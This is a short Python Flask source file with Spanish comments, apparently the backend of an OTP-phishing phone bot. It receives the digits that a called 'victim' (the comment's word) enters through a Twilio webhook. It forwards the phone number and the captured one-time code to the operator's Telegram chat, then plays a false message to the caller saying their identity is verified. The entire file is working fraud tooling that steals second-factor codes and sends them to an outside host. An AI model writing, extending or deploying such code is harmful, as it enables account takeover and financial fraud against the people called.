from flask import Flask, request
import requests

app = Flask(__name__)

# --- CONFIGURACIÓN ---
TELEGRAM_TOKEN = 'TU_TELEGRAM_TOKEN'
TU_CHAT_ID = 'TU_ID_DE_USUARIO' 

@app.route("/otp-recibido", methods=['POST'])
def otp_recibido():
    # Twilio envía los números marcados en el parámetro 'Digits'
    codigo = request.form.get('Digits')
    telefono = request.form.get('To')
    
    if codigo:
        mensaje = f"🎯 **CÓDIGO CAPTURADO**\n📱 Número: `{telefono}`\n🔑 OTP: `{codigo}`"
        
        # Enviar a tu Telegram
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        requests.post(url, data={'chat_id': TU_CHAT_ID, 'text': mensaje, 'parse_mode': 'Markdown'})
        
        # Esto es lo que escucha la víctima después de marcar
        return """
        <Response>
            <Say language="es-MX">Gracias, su identidad ha sido validada. Ya puede colgar.</Say>
            <Hangup/>
        </Response>
        """, 200
    return "No data", 400

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
